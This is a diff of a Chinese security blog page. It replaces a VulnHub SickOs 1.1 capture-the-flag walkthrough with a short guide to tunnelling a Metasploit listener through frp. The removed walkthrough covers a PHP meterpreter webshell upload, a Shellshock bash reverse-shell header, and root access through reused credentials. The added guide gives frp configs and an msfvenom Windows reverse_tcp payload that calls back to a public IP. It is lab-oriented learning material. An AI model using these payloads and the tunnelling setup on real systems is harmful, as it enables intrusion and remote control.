@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="VulnHub-SickOs-1.1渗透学习, JAVA、Web安全、代码审计、免杀">
+    <meta name="keywords" content="Frp内网穿透把MSF拖入内网, JAVA、Web安全、代码审计、免杀">
     <meta name="description" content="逆风的方向更适合飞翔">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>VulnHub-SickOs-1.1渗透学习 | F10Sec</title>
+    <title>Frp内网穿透把MSF拖入内网 | F10Sec</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/libs/awesome/css/all.css">
@@ -334,12 +334,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/medias/featureimages/9.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">VulnHub-SickOs-1.1渗透学习</h1>
+                    <h1 class="description center-align post-title">Frp内网穿透把MSF拖入内网</h1>
                 </div>
             </div>
         </div>
@@ -455,8 +455,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E9%9D%B6%E6%9C%BA/">
-                                <span class="chip bg-color">靶机</span>
+                            <a href="/tags/FRP-MSF/">
+                                <span class="chip bg-color">FRP MSF</span>
                             </a>
                         
                     </div>
@@ -485,14 +485,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    580
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    2 分
                 </div>
                 
 
@@ -520,167 +520,65 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/sickos/sick0s1.1.7z">https://download.vulnhub.com/sickos/sick0s1.1.7z</a></p>
-<p>靶机难度：中级（CTF）</p>
-<p>靶机发布日期：2015年12月11日</p>
-<p>靶机描述：这个CTF明确地比喻了如何在网络上执行黑客策略，以在安全的环境中危害网络。 这个虚拟机与我在OSCP中遇到的实验室非常相似。 目的是破坏网络/计算机并在其上获得管理/根目录特权。</p>
-<p>目标：得到root权限&amp;找到flag.txt</p>
-<p>作者：F10Sec</p>
-<p>时间：2021-07-05</p>
-<p>请注意：</p>
-<p>对于所有这些计算机，我已经使用VMware运行下载的计算机。我将使用Kali Linux作为解决该目标的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>我们在VM中需要确定攻击目标的IP地址，可以使用netdiscover/nmap来获取目标主机的IP地址：</p>
-<pre class="line-numbers language-go" data-language="go"><code class="language-go">nmap <span class="token operator">-</span>sP <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span> <span class="token operator">-</span>T4
-参数解读：
-	<span class="token operator">-</span>sP <span class="token punctuation">:</span> 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping
-	<span class="token operator">-</span>T4： 指定扫描过程使用的时序，总有<span class="token number">6</span>个级别（<span class="token number">0</span><span class="token operator">-</span><span class="token number">5</span>），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>frp 中文文档：<a target="_blank" rel="noopener" href="https://gofrp.org/docs/">https://gofrp.org/docs/</a></p>
+<p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网；</p>
+<p>frp下载地址：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
+<h2 id="FPR简介"><a href="#FPR简介" class="headerlink" title="FPR简介"></a>FPR简介</h2><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191706956.jpeg" alt="img"></p>
+<p>通过在具有公网 IP 的节点上部署 frp 服务端，可以轻松地将内网服务穿透到公网，同时提供诸多专业的功能特性，这包括：</p>
+<ul>
+<li><p>客户端服务端通信支持 TCP、KCP 以及 Websocket 等多种协议。</p>
+</li>
+<li><p>采用 TCP 连接流式复用，在单个连接间承载更多请求，节省连接建立时间。</p>
+</li>
+<li><p>代理组间的负载均衡。</p>
+</li>
+<li><p>端口复用，多个服务通过同一个服务端端口暴露。</p>
+</li>
+<li><p>多个原生支持的客户端插件（静态文件查看，HTTP、SOCK5 代理等），便于独立使用 frp 客户端完成某些工作。</p>
+</li>
+<li><p>高度扩展性的服务端插件系统，方便结合自身需求进行功能扩展。</p>
+</li>
+<li><p>服务端和客户端 UI 页面。</p>
+</li>
+</ul>
+<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>编写配置文件，先通过 ./frps -c ./frps.ini 启动服务端，再通过 ./frpc -c ./frpc.ini 启动客户端。如果需要在后台长期运行，建议结合其他工具使用，例如 systemd 和 supervisor；</p>
+<p>1、服务端frps.ini 内容如下</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>
+bind_port <span class="token operator">=</span> <span class="token number">10014</span>
+token <span class="token operator">=</span> <span class="token number">12345678</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616298.png" alt="img"></p>
-<p>我们已经找到了目标计算机IP地址：192.168.1.11</p>
-<p>第一步是找出目标计算机上可用的开放端口和一些服务。因此我在目标计算机上启动了nmap全端口T5速度扫描：</p>
-<pre class="line-numbers language-go" data-language="go"><code class="language-go">nmap <span class="token operator">-</span>sS <span class="token operator">-</span>sV <span class="token operator">-</span>sC <span class="token operator">-</span>O <span class="token operator">-</span>T5  <span class="token operator">-</span>Pn <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.11</span>
-参数解读：
-	<span class="token operator">-</span>A ：启用<span class="token operator">-</span>A选项之后，Nmap将检测目标主机的下述信息
-        服务版本识别（<span class="token operator">-</span>sV）；
-        操作系统识别（<span class="token operator">-</span>O）；
-        脚本扫描（<span class="token operator">-</span>sC）；
-        Traceroute（–traceroute）
-	<span class="token operator">-</span>sS<span class="token operator">/</span>sT<span class="token operator">/</span>sA<span class="token operator">/</span>sW<span class="token operator">/</span>sM<span class="token punctuation">:</span>指定使用 TCP SYN<span class="token operator">/</span><span class="token function">Connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span>ACK<span class="token operator">/</span>Window<span class="token operator">/</span>Maimon scans的方式来对目标主机进行扫描
-	<span class="token operator">-</span>sV<span class="token punctuation">:</span> 指定让Nmap进行服务版本扫描
-	<span class="token operator">-</span>p<span class="token operator">-</span>：进行全端口扫描
-	<span class="token operator">-</span>Pn：禁用主机检测（<span class="token operator">-</span>Pn）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191706841.png" alt="img"></p>
+<p>2、在需要暴露到内网的机器上部署 frpc，frpc.ini配置如下：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span>common<span class="token punctuation">]</span>
+server_addr <span class="token operator">=</span> <span class="token number">45.32</span><span class="token number">.38</span><span class="token number">.119</span>
+server_port <span class="token operator">=</span> <span class="token number">10014</span>
+token <span class="token operator">=</span> <span class="token number">12345678</span>
+<span class="token punctuation">[</span>ssh<span class="token punctuation">]</span>
+<span class="token builtin">type</span> <span class="token operator">=</span> tcp
+local_ip <span class="token operator">=</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>           
+local_port <span class="token operator">=</span> <span class="token number">1234</span>
+remote_port <span class="token operator">=</span> <span class="token number">10015</span> 
 
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616592.png" alt="img"></p>
-<table>
-<thead>
-<tr>
-<th>PORT</th>
-<th>SERVICE</th>
-<th>VERSION DETECTION</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>TCP: 22</td>
-<td>SSH</td>
-<td>OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)</td>
-</tr>
-<tr>
-<td>TCP: 3128</td>
-<td>HTTP-Proxy</td>
-<td>Squid http proxy 3.1.19</td>
-</tr>
-<tr>
-<td>TCP: 8080</td>
-<td>HTTP-Proxy</td>
-<td>http proxy 3.1.19</td>
-</tr>
-</tbody></table>
-<p>目标计算机上开放了22、3128、8080三个端口。</p>
-<h2 id="Squid-枚举"><a href="#Squid-枚举" class="headerlink" title="Squid 枚举"></a>Squid 枚举</h2><p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616669.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616803.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616470.png" alt="img"></p>
-<h2 id="Nikto-通过代理扫描"><a href="#Nikto-通过代理扫描" class="headerlink" title="Nikto 通过代理扫描"></a>Nikto 通过代理扫描</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">nikto ：开源的WEB扫描评估软件，可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等
+其中common字段下的三项即为服务端的设置。
 
-nikto <span class="token operator">-</span>h 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11 <span class="token operator">-</span>useproxy http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11:3128<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+“server_addr”为服务端IP地址，填入即可。
+“server_port”为服务器端口，填入你设置的端口号即可，如果未改变就是<span class="token number">7000</span>
+“token”是你在服务器上设置的连接口令，原样填入即可。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191616990.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617155.png" alt="img"></p>
-<table>
-<thead>
-<tr>
-<th><a target="_blank" rel="noopener" href="https://www.wappalyzer.com/technologies/web-servers/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer">Web 服务器</a></th>
-<th>编程语言</th>
-<th><a target="_blank" rel="noopener" href="https://www.wappalyzer.com/technologies/operating-systems/?utm_source=popup&utm_medium=extension&utm_campaign=wappalyzer">操作系统</a></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Apache: 2.2.22</td>
-<td>PHP 5.3.10</td>
-<td>Ubuntu</td>
-</tr>
-</tbody></table>
-<p>Nikto 扫描发现存在<code>robots.txt</code>目录、<code>cgi-bin/status</code>（容易受到shellshock攻击），存在可利用漏洞；</p>
-<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>这边先用开启代理，然后访问目标主机的80端口；</p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617771.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617709.png" alt="img"></p>
-<p>查看源代码没啥游泳的信息，这边是用代理来访问的80，打开robots.txt发现存在wolfcms目录；</p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617365.png" alt="img"></p>
-<p>找到/wolfcms的信息，有可能此网站是使用Wolf CMS中搭建的，也可能是个目录……..</p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617306.png" alt="img"></p>
-<p>使用搜索引擎搜索Wolf CMS，发现是个开源的CMS，在github[<a target="_blank" rel="noopener" href="https://github.com/wolfcms/wolfcms]%E4%B8%8A%E5%8F%AF%E4%BB%A5%E6%9F%A5%E7%9C%8B%E5%88%B0%E6%BA%90%E7%A0%81%E4%BF%A1%E6%81%AF%EF%BC%9B">https://github.com/wolfcms/wolfcms]上可以查看到源码信息；</a></p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617175.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617808.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191617256.png" alt="img"></p>
-<h2 id="目录枚举"><a href="#目录枚举" class="headerlink" title="目录枚举"></a>目录枚举</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">gobuster <span class="token function">dir</span> <span class="token operator">-</span>u http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/wolfcms/  <span class="token operator">-</span>w <span class="token operator">/</span>usr/share/wordlists/dirbuster/directory-list-2<span class="token punctuation">.</span>3-medium<span class="token punctuation">.</span>txt <span class="token operator">-</span>t 50 <span class="token operator">--</span>random-agent   <span class="token operator">--</span>proxy   http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11:3128<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707427.png" alt="img"></p>
+<p>注意：客户端连接服务端提示访问被拒绝，则需要服务端开放防火墙端口（学习的话全开就行了，生产环境除外）</p>
+<h2 id="联动MSF"><a href="#联动MSF" class="headerlink" title="联动MSF"></a>联动MSF</h2><p>启动FRP服务端：</p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707174.png" alt="img"></p>
+<p>启动FRP客户端：</p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707667.png" alt="img"></p>
+<p>启动MSF监听：</p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707536.png" alt="img"></p>
+<p>使用msf生成payload实现主机上线：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">msfvenom <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp  lhost<span class="token operator">=</span><span class="token number">45.32</span><span class="token number">.38</span><span class="token number">.119</span> lport<span class="token operator">=</span><span class="token number">10015</span> <span class="token operator">-</span>f exe <span class="token operator">-</span>o frptest<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618447.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618617.png" alt="img"></p>
-<p>访问下/?/admin/login，这是通病…遇到Wolf cms直接能使用这个目录进入登录界面</p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618975.png" alt="img"></p>
-<p>使用账户密码admin/admin成功登录到网站后台(不要问我怎么知道的…….)</p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618419.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618261.png" alt="img"></p>
-<h2 id="上传Webshell"><a href="#上传Webshell" class="headerlink" title="上传Webshell"></a>上传Webshell</h2><h3 id="1、上传php-meterpreter-payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；"><a href="#1、上传php-meterpreter-payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；" class="headerlink" title="1、上传php meterpreter payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；"></a>1、上传php meterpreter payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；</h3><p>成功登录后，发现能上传文件，这边要使用msfvenom做PHP木马文件上传进行shell提权</p>
-<h4 id="1、筛选payload"><a href="#1、筛选payload" class="headerlink" title="1、筛选payload"></a>1、筛选payload</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfvenom <span class="token operator">-</span>l payload <span class="token punctuation">|</span> grep php <span class="token punctuation">|</span> grep meterpreter    筛选合适的payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191618025.png" alt="img"></p>
-<h4 id="2、生成payload"><a href="#2、生成payload" class="headerlink" title="2、生成payload"></a>2、生成payload</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msfvenom <span class="token operator">-</span>p php/meterpreter_reverse_tcp lhost=192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>7 lport=6666 <span class="token operator">-</span>o Wolfcms<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619417.png" alt="img"></p>
-<h4 id="3、上传payload"><a href="#3、上传payload" class="headerlink" title="3、上传payload"></a>3、上传payload</h4><p>在web页面上传后记录下上传文件的路径；</p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619999.png" alt="img"></p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">上传后文件的目录：http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>11/wolfcms/public/Wolfcms<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<h4 id="4、Kali设置监听载荷"><a href="#4、Kali设置监听载荷" class="headerlink" title="4、Kali设置监听载荷"></a>4、Kali设置监听载荷</h4><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">use exploit/multi/handler
-<span class="token function">set</span> payload php/meterpreter_reverse_tcp
-show options
-<span class="token function">set</span> LHOST 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>7
-<span class="token function">set</span> LPORT 6666
-exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619404.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619212.png" alt="img"></p>
-<p>注意：此时上传的php类型的Meterpreter是不具备完整功能的，因此可以继续上传对应操作系统类型的payload获取更多的操作功能；这里发现随然获取了Metrepreter会话，但是shell命令无法执行，后续使用冰蝎上传weblshell连接；</p>
-<h3 id="2、利用冰蝎上传weblshell连接"><a href="#2、利用冰蝎上传weblshell连接" class="headerlink" title="2、利用冰蝎上传weblshell连接"></a>2、利用冰蝎上传weblshell连接</h3><p>这里必须配置好代理才可以正常连接webshell；</p>
-<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619370.png" alt="img"></h4><h2 id="Shellshock-Bash-反向-Shell"><a href="#Shellshock-Bash-反向-Shell" class="headerlink" title="Shellshock Bash 反向 Shell"></a>Shellshock Bash 反向 Shell</h2><p>Burp Suite 用于操作 User-Agent：包括 bash 反向 shell。</p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> ignored<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token operator">/</span>bin/bash <span class="token operator">-</span>i >&amp; <span class="token operator">/</span>dev/tcp/192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>221<span class="token punctuation">.</span>139/443 0>&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619992.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191619018.png" alt="img"></p>
-<p>查看/var/www/wolfcms/目录下的config.php文件；</p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token operator">/</span><span class="token operator">/</span> Database settings:
-<span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_DSN'</span><span class="token punctuation">,</span> <span class="token string">'mysql:dbname=wolf;host=localhost;port=3306'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_USER'</span><span class="token punctuation">,</span> <span class="token string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'DB_PASS'</span><span class="token punctuation">,</span> <span class="token string">'john@123'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">define</span><span class="token punctuation">(</span><span class="token string">'TABLE_PREFIX'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>查看系统存在的可登录账户：</p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620535.png" alt="img"></p>
-<p>使用python一句话获取标准shell</p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">python <span class="token operator">-</span>c <span class="token string">'import pty;pty.spawn("/bin/bash")'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620816.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620133.png" alt="img"></p>
-<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">www-<span class="token keyword">data</span>@SickOs:<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www$ su <span class="token operator">-</span> sickos
-su <span class="token operator">-</span> sickos
-Password: john@123
-
-sickos@SickOs:~$ <span class="token function">ls</span>     
-<span class="token function">ls</span>
-sickos@SickOs:~$ <span class="token function">cat</span> <span class="token punctuation">.</span>bash_history
-<span class="token function">cat</span> <span class="token punctuation">.</span>bash_history
-sudo su
-<span class="token keyword">exit</span>
-sickos@SickOs:~$ sudo su
-sudo su
-<span class="token namespace">[sudo]</span> password <span class="token keyword">for</span> sickos: john@123
-
-root@SickOs:<span class="token operator">/</span>home/sickos<span class="token comment"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620364.png" alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191620177.png" alt="img"></p>
-<p>成功获取到Flag；</p>
-<p>若有收获，就点个赞吧</p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707254.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707659.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/F10Sec/F10Sec.github.blog/main/202201191707135.png" alt="img"></p>
 
                 
             </div>
@@ -707,7 +605,7 @@ root@SickOs:<span class="token operator">/</span>home/sickos<span class="token c
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://F10Sec.github.io/2022/01/19/vulnhub-sickos-1.1-shen-tou-xue-xi/">https://F10Sec.github.io/2022/01/19/vulnhub-sickos-1.1-shen-tou-xue-xi/</a>
+                    <a href="https://F10Sec.github.io/2022/01/19/frp-nei-wang-chuan-tou-ba-msf-tuo-ru-nei-wang/">https://F10Sec.github.io/2022/01/19/frp-nei-wang-chuan-tou-ba-msf-tuo-ru-nei-wang/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -745,8 +643,8 @@ root@SickOs:<span class="token operator">/</span>home/sickos<span class="token c
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E9%9D%B6%E6%9C%BA/">
-                                    <span class="chip bg-color">靶机</span>
+                                <a href="/tags/FRP-MSF/">
+                                    <span class="chip bg-color">FRP MSF</span>
                                 </a>
                             
                         </div>
@@ -812,17 +710,18 @@ root@SickOs:<span class="token operator">/</span>home/sickos<span class="token c
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/01/19/hexo-da-jian-ge-ren-bo-ke-xi-lie-ji-chu-jian-zhan-pian/">
+                <a href="/2022/01/19/frp-nei-wang-chuan-tou-ba-msf-tuo-ru-nei-wang/">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/medias/featureimages/13.jpg" class="responsive-img" alt="Hexo搭建个人博客系列：基础建站篇">
+                        <img src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/medias/featureimages/9.jpg" class="responsive-img" alt="Frp内网穿透把MSF拖入内网">
                         
-                        <span class="card-title">Hexo搭建个人博客系列：基础建站篇</span>
+                        <span class="card-title">Frp内网穿透把MSF拖入内网</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -832,9 +731,9 @@ root@SickOs:<span class="token operator">/</span>home/sickos<span class="token c
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-01-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-01-19
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -843,11 +742,12 @@ root@SickOs:<span class="token operator">/</span>home/sickos<span class="token c
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%AB%99%E7%82%B9%E6%90%AD%E5%BB%BA%E3%80%81Hexo/">
-                        <span class="chip bg-color">站点搭建、Hexo</span>
+                    <a href="/tags/FRP-MSF/">
+                        <span class="chip bg-color">FRP MSF</span>
                     </a>
                     
                 </div>
@@ -861,13 +761,13 @@ root@SickOs:<span class="token operator">/</span>home/sickos<span class="token c
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/01/19/fastjson-hui-xian/">
+                <a href="/2022/01/19/hexo-da-jian-ge-ren-bo-ke-xi-lie-ji-chu-jian-zhan-pian/">
                     <div class="card-image">
                         
                         
-                        <img src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/medias/featureimages/12.jpg" class="responsive-img" alt="Fastjson回显">
+                        <img src="https://cdn.jsdelivr.net/gh/F10Sec/F10Sec.github.io/medias/featureimages/13.jpg" class="responsive-img" alt="Hexo搭建个人博客系列：基础建站篇">
                         
-                        <span class="card-title">Fastjson回显</span>
+                        <span class="card-title">Hexo搭建个人博客系列：基础建站篇</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -891,8 +791,8 @@ root@SickOs:<span class="token operator">/</span>home/sickos<span class="token c
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Fastjson/">
-                        <span class="chip bg-color">Fastjson</span>
+                    <a href="/tags/%E7%AB%99%E7%82%B9%E6%90%AD%E5%BB%BA%E3%80%81Hexo/">
+                        <span class="chip bg-color">站点搭建、Hexo</span>
                     </a>
                     
                 </div>
